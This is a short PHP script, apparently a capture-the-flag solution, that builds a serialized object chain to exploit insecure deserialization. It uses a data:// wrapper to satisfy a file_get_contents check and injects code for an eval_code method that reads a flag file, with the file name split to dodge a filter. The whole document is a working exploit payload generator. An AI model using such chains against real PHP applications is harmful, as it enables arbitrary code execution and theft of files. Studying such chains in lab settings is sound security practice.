<?php
class aaa {
    public $method;
}

class bbb {
    public $str;
}

class ccc {
    public $thing;
    public $card;
}

class ddd {
    public $code;
}

$a = new aaa();
$c = new ccc();
$b = new bbb();
$d = new ddd();

$c->card = "data://text/plain,Do you know the function file_get_contents?";
$d->code = "echo file_get_contents('/f'.'lag2');exit();";
$b->str = [$d, "eval_code"];
$c->thing = $b;
$a->method = $c;

echo urlencode(serialize($a));